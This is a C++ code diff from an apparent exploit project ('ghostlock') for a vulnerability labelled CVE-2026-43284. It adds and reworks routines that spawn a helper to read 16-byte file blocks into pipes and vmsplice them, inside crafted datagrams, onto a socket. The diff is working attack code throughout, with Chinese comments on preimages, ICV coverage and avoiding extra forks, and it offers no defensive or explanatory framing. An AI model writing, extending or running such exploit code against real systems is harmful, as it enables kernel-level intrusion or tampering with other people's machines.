@@ -149,6 +149,11 @@ namespace ghostlock::backend::cve_2026_43284::landing {
             return n < 0 ? static_cast<long>(-errno) : static_cast<long>(n);
         }
 
+        long real_read_pipe(int fd, std::uint8_t *out, std::size_t len) noexcept {
+            const ssize_t n = ::read(fd, out, len);
+            return n < 0 ? static_cast<long>(-errno) : static_cast<long>(n);
+        }
+
         int real_close_fd(int fd) noexcept {
             return ::close(fd) == 0 ? 0 : -errno;
         }
@@ -158,7 +163,7 @@ namespace ghostlock::backend::cve_2026_43284::landing {
     SpliceIoOps real_splice_io() noexcept {
 #if defined(__linux__)
         return SpliceIoOps{&real_pipe2, &real_splice, &real_vmsplice,
-                           &real_send_datagram, &real_read_at, &real_close_fd};
+                           &real_send_datagram, &real_read_at, &real_read_pipe, &real_close_fd};
 #else
         return SpliceIoOps{};
 #endif
@@ -217,6 +222,79 @@ namespace ghostlock::backend::cve_2026_43284::landing {
         return direct;
     }
 
+    long RealSpliceIo::fetch_block(int fd, std::uint8_t *out, std::uint64_t offset) noexcept {
+        if (out == nullptr) {
+            return -EINVAL;
+        }
+        if (fd >= 0) {
+            /* A descriptor this process can read: the direct read already is the one-call path. */
+            return read_at(fd, out, kBlockBytes, offset);
+        }
+        if (!helper_.available()) {
+            /* No helper to run: the older single-read source is all that is left, and it is the
+             * same one exec when it is bound. */
+            if (old_page_.available()) {
+                return old_page_.read16(old_page_.ctx, offset, out);
+            }
+            return -EBADF;
+        }
+        if (!io_.available()) {
+            return -EIO;
+        }
+        /*
+         * 一次 exec 同时拿到 preimage 与密文页（成功历史：ref@5f184760 pagecache.cpp:158-165 的
+         * old_page 回退 + :231 的 helper splice16；那边是 pread 直读所以不付第二次 exec）。
+         * helper 的 argv 是 {offset, path}，它把该偏移的 16 字节写到 stdout；把 stdout 接到我们
+         * 这条管道，再读回这 16 字节 —— 这 16 字节既是 preimage，也是要进发送管道的密文页。
+         */
+        int fds[2] = {-1, -1};
+        if (io_.pipe2(fds, pipe_flags_) != 0) {
+            return -EIO;
+        }
+        GL_LOGI("fetch_block: offset=%llu pipe=[%d,%d]", static_cast<unsigned long long>(offset),
+                fds[0], fds[1]);
+        const long spawned = helper_.splice16(helper_.ctx, fds[1], offset);
+        /* 我们自己的写端必须先关：helper 写不满时，只读端会一直等一个本进程还开着的管道。 */
+        static_cast<void>(io_.close_fd(fds[1]));
+        fds[1] = -1;
+        long got = 0;
+        if (spawned == static_cast<long>(kBlockBytes)) {
+            while (got < static_cast<long>(kBlockBytes)) {
+                const long n = io_.read_pipe(fds[0], out + got,
+                                             kBlockBytes - static_cast<std::size_t>(got));
+                if (n == -EINTR) {
+                    continue;
+                }
+                if (n < 0) {
+                    got = n;
+                    break;
+                }
+                if (n == 0) {
+                    break;
+                }
+                if (n > static_cast<long>(kBlockBytes) - got) {
+                    got = -EIO;
+                    break;
+                }
+                got += n;
+            }
+        } else {
+            got = spawned;
+        }
+        close_pair(io_, fds);
+        /* 短读/失败一律 fail-closed：调用方只有拿到整整 16 字节才会组帧。 */
+        if (got != static_cast<long>(kBlockBytes)) {
+            GL_LOGI("fetch_block: refused helper=%ld got=%ld offset=%llu",
+                    spawned, got, static_cast<unsigned long long>(offset));
+            return got;
+        }
+        GL_LOGI("fetch_block: ok offset=%llu head=%02x%02x%02x%02x",
+                static_cast<unsigned long long>(offset), static_cast<unsigned>(out[0]),
+                static_cast<unsigned>(out[1]), static_cast<unsigned>(out[2]),
+                static_cast<unsigned>(out[3]));
+        return static_cast<long>(kBlockBytes);
+    }
+
     bool RealSpliceIo::splice_one(int socket_fd, const std::uint8_t *datagram,
                                   std::size_t size, std::uint64_t offset) noexcept {
         if (datagram == nullptr || socket_fd < 0) {
@@ -259,18 +337,21 @@ namespace ghostlock::backend::cve_2026_43284::landing {
                 GL_LOGI("splice_one: page spliced=%llu want=%zu cursor=%llu",
                         cursor - offset, kBlockBytes, static_cast<unsigned long long>(cursor));
             } else {
-                const long spliced = helper_.splice16(helper_.ctx, fds[1], offset);
-                /* 并排事实：helper 送进管道的块数，以及经同一来源读该处会得到的前 4 字节。 */
-                std::uint8_t probe[16] = {};
-                const long probed = old_page_.available()
-                                   ? old_page_.read16(old_page_.ctx, offset, probe)
-                                   : -1;
-                GL_LOGI("helper splice: offset=%llu spliced=%ld probed=%ld head=%02x%02x%02x%02x fd=%d helper_avail=%d",
-                        static_cast<unsigned long long>(offset), spliced, probed,
-                        static_cast<unsigned>(probe[0]), static_cast<unsigned>(probe[1]),
-                        static_cast<unsigned>(probe[2]), static_cast<unsigned>(probe[3]),
-                        file_fd_, helper_.available() ? 1 : 0);
-                if (spliced != static_cast<long>(kBlockBytes)) { last_error_ = 22; break; }
+                /* 旧码（本轮替换：不再第二次 fork；旧的探针 read16 也是纯诊断、同样是一次 exec）：
+                 * const long spliced = helper_.splice16(helper_.ctx, fds[1], offset);
+                 * std::uint8_t probe[16] = {};
+                 * const long probed = old_page_.available() ? old_page_.read16(...) : -1;
+                 * if (spliced != 16) { last_error_ = 22; break; }
+                 * TODO(2026-10-16：fetch_block 的那一次 exec 已把同一份十六字节交回来了，它们就在
+                 * 报文的密文槽里；这里只把它们映射进管道，报文与 ICV 覆盖的字节完全一致，且不再
+                 * fork。门禁全绿并确认后删除本旧码块)。 */
+                GL_LOGI("splice_one: segment page from frame offset=%llu len=%zu -> pipe=%d",
+                        static_cast<unsigned long long>(offset), kBlockBytes, fds[1]);
+                if (!vmsplice_all(io_, fds[1], datagram + kHeaderBytes + kBlockBytes,
+                                  kBlockBytes)) {
+                    last_error_ = 22;
+                    break;
+                }
             }
             const std::size_t suffix = size - kMinDatagramBytes;
             GL_LOGI("splice_one: segment icv=%zu (prefix=%zu)", suffix, kMinDatagramBytes);
